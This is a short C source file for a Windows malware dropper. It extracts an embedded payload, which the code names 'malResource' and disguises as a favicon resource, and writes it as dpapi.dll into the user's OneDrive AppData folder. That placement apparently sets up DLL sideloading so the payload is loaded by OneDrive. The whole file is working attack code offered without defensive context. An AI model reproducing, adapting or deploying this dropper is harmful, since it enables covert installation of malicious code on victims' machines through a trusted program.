// By Abdulaziz Almetairy
// Github.com/oh-az

#include <windows.h>
#include "resources.h"

int main(void) {
    

	HANDLE hFile;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	char * pathToExe= strcat(getenv("USERPROFILE"),"\\AppData\\Local\\Microsoft\\OneDrive\\dpapi.dll");
	unsigned char * malResource;
	unsigned int malResource_len;
	DWORD BytesWritten = 0;
	BOOL writeStatus;
	
	// Extract DLL from resource section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	malResource = (char *) LockResource(resHandle);
	malResource_len = SizeofResource(NULL, res);

	// Create new file using the path we provided.
    hFile = CreateFile(pathToExe,                // name of the write
                       GENERIC_WRITE,          // open for writing
                       0,                      // do not share
                       NULL,                   // default security
                       CREATE_ALWAYS,             // create new file even if it exists
                       FILE_ATTRIBUTE_NORMAL,  // normal file
                       NULL);                  // no attr. template

    // Write to the file
    writeStatus = WriteFile( 
				hFile,           // open file handle
                malResource,      // start of data to write
                malResource_len,  // number of bytes to write
                &BytesWritten, // number of bytes that were written
                NULL);            // no overlapped structure

    CloseHandle(hFile);
}
